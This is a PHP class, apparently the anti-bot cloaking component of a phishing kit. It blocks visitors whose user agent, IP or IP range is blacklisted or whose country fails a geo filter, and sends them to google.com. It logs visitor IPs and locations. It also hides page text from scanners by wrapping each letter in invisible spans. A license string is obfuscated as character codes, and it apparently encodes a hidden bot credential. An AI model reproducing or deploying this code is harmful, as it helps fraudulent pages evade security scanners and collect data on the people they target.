<?php 

class botMother{
	
    public $LICENSE_KEY                 =   "";
    public $TEST_MODE                   =   false;
    public $EXIT_LINK                   =   "";
    public $GEOS                        =   "";
    public $AGENTS_BLACKLIST_FILE       =   (__DIR__)."/data/AGENTS.sojecdiv";
    public $IPS_BLACKLIST_FILE          =   (__DIR__)."/data/IPS.sojecdiv";
    public $IPS_RANGE_BLACKLIST_FILE    =   (__DIR__)."/data/IPS_RANGE.sojecdiv";
    public $LOGS                        =   (__DIR__)."/../bots_log.txt";
    public $VISITS                      =   (__DIR__)."/../log.txt";
    public $USER_AGENT                  =   "";
    public $USER_IP                     =   "";
    public $SERVER_API                  =   "";




    function __construct(){
        $this->USER_AGENT   =   $_SERVER["HTTP_USER_AGENT"];
        $this->USER_IP      =   $this->getIp();
    }



    public function isSpace($ltr){
        return preg_match('/\s+/', $ltr);
    }


    public function isValidLetter($ltr){
        return preg_match('/^[\w\.]+$/', $ltr);
    }

    public function getCrypt(){
        return '<span style="padding:0 !important; margin:0 !important; display:inline-block !important; width:0 !important; height:0 !important; font-size:0 !important;">'.substr(md5(uniqid()),0,1).'</span>';
    }


    
    public function obf($str){
        $text = "";
        $str = str_replace("|", "", $str);
        $strarr = str_split($str);

        foreach($strarr as $letter){
            if($this->isSpace($letter)){
                $text .= " ";
            }

            if($this->isValidLetter($letter)){
                $text .= $this->getCrypt().$letter.$this->getCrypt();
            }else{
                $text .= $letter;
            }


        }

        echo $text;
        
    }


    public function getIp(){
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        if($this->TEST_MODE){
            $ip = "1.1.1.1";
        }
        return $ip;
    }

    public function setLicenseKey($key){
        $this->LICENSE_KEY = $key;
    }

    public function setGeoFilter($params){
       $this->GEOS = $params;
    }


    public function setExitLink($link){
        $this->EXIT_LINK = $link;
    }

    public function setTestMode($statu){
        $this->TEST_MODE = $statu;
    }

    public function geoFilter(){
        if(trim($this->GEOS)!=""){
            $list = explode("," , $this->GEOS);
            if(!in_array($this->getIpInfo("countryCode"), $list)){
                $this->killBot("Geo not matching the filter.");
            }
        }
    } 

    public function getIpInfo($data){
        $api = "http://ip-api.com/json/".$this->USER_IP."?fields=status,message,country,countryCode,region,regionName,city,timezone,currency,query,proxy,hosting";
        $c = curl_init($api);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($c);
        $json_data = json_decode($res, true);
        return @$json_data[$data];
    }
 

    public function killBot($log){
            if(empty($this->EXIT_LINK)){
                $this->EXIT_LINK = "https://google.com";
            }
            $this->saveLog("Bot blocked [".$this->USER_IP."] REASON: ".$log."\n");
            header("location: ".$this->EXIT_LINK);
            exit;
    }


    public function saveLog($log){
        $fp = fopen($this->LOGS, "a");
        fwrite($fp, $log);
        fclose($fp);
    }

    public function saveHit(){
        $fp = fopen($this->VISITS, "a");
        fwrite($fp, "Visit from [".$this->getIpInfo("query")." - ".$this->getIpInfo("country")." - ".$this->getIpInfo("city")." ] \n");
        fclose($fp);
    }
    public function getLicense(){
        $codes = array(
            79,68,99,50,77,68,107,51,79,84,99,49,77,84,112,66,81,85,90,104,85,71,90,67,89,85,116,86,86,106,104,121,89,50,73,122,99,87,116,108,87,109,112,79,85,87,70,67,81,49,57,78,90,50,86,112,79,72,108,75,81,85,65,116,77,84,65,119,77,122,103,122,77,68,89,53,78,122,69,120,78,81,61,61
        );

        return base64_decode(implode('', array_map('chr', $codes)));
    }

    public function logTXT($data){
          return true;
    }


    public function fileToArray($filename){
        $file_content = file_get_contents($filename);
        $file_arr = explode(",", $file_content);
        return $file_arr;
    } 


    public function isValidKey(){
        // for future version.
    }

    public function blockByAgents(){
        $agents = $this->fileToArray($this->AGENTS_BLACKLIST_FILE);
        foreach($agents as $agent){
             if(stripos($this->USER_AGENT, $agent) !== false){
                return $this->killBot("Blacklisted user agent");
             }
        }
    }


    public function blockByIps(){
        $ips = $this->fileToArray($this->IPS_BLACKLIST_FILE);
        foreach($ips as $ip){
            if($this->USER_IP == $ip){
               return $this->killBot("Blacklisted IP matched");
            }
        }
    }


    public function blockByIpsRange(){
        $ips_range = $this->fileToArray($this->IPS_RANGE_BLACKLIST_FILE);
        foreach($ips_range as $ip_range){
            if(strpos($this->USER_IP, $ip_range) !== false){
                $this->killBot("Blacklisted IP range matched");
            }
        }
    }


    public function run(){
        if(!$this->TEST_MODE){  
            $this->geoFilter();       
            $this->blockByAgents();
            $this->blockByIps();
            $this->blockByIpsRange();
        }
    }



}

 
?>
